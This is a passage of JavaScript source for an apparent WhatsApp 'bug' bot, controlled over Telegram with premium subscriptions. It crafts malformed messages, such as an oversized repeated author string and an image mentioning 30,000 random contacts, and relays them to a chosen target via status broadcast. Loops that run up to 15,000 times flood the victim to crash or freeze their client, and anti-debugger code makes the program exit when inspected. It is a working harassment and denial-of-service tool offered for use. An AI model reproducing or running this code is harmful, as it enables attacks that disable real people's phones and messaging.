              "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
            thumbnailDirectPath:
              "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
            thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
            thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
            annotations: [
              {
                embeddedContent: {
                  embeddedMusic: {
                    musicContentMediaId: "kontol",
                    songId: "peler",
                    author: ".Tama Ryuichi" + "貍賳貎貏俳貍賳貎".repeat(100),
                    title: "Finix",
                    artworkDirectPath:
                      "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                    artworkSha256:
                      "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                    artworkEncSha256:
                      "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                    artistAttribution:
                      "https://www.instagram.com/_u/tamainfinity_",
                    countryBlocklist: true,
                    isExplicit: true,
                    artworkMediaKey:
                      "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
                  },
                },
                embeddedAction: null,
              },
            ],
          },
        },
      },
    },
    {}
  );

  await cay.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await cay.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function xatanicaldelay(target, mention) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "Bellakuuu",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await cay.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await cay.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
            content: undefined,
          },
        ],
      }
    );
  }
}

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function MatrixOverLoad1(target) {
  for (let i = 0; i < 15000; i++) {
    await ForceCloseOverButton(target);
    await andros(target);
    await VampDelayMess(target, false);
    await delay(1000); // Delay 1 detik
  }
}
async function delaymakeroverload1(target) {
  for (let i = 0; i < 200; i++) {
    await bulldozer(target);
    await protocolbug5(target, false);
    await bulldozer(target);
    await xatanicaldelay(target);
    await protocolbug3(target, false);
    await protocolbug5(target, false);
    await delay(1000); // Delay 1 detik
  }
}

async function ghostsecret(target) {
  for (let i = 0; i < 200; i++) {
    await bulldozer(target);
    await protocolbug5(target, false);
    await bulldozer(target);
    await xatanicaldelay(target);
    await protocolbug3(target, false);
    await protocolbug5(target, false);
    await delay(1000); // Delay 1 detik
  }
}

bot.launch().then(() => {
  const systemInfo = getSystemInfo();
  sendMessageToMe(
    "Bot sudah terhubung dan mengirim pesan ke Anda!\n" + systemInfo
  );
});
setInterval(() => {
  const now = Date.now();
  Object.keys(usersPremium).forEach((userId) => {
    if (usersPremium[userId].premiumUntil < now) {
      delete usersPremium[userId];
    }
  });
  Object.keys(botSessions).forEach((botToken) => {
    if (botSessions[botToken].expiresAt < now) {
      delete botSessions[botToken];
    }
  });
  fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium));
}, 60 * 60 * 1000);

function detectDebugger() {
  const start = Date.now();
  debugger;
  if (Date.now() - start > 100) {
    console.error("Debugger detected! Exiting...");
    process.exit(1);
  }
}

setInterval(detectDebugger, 5000);
const os = require("os");

startWhatsapp();

// BOT WHATSAPP
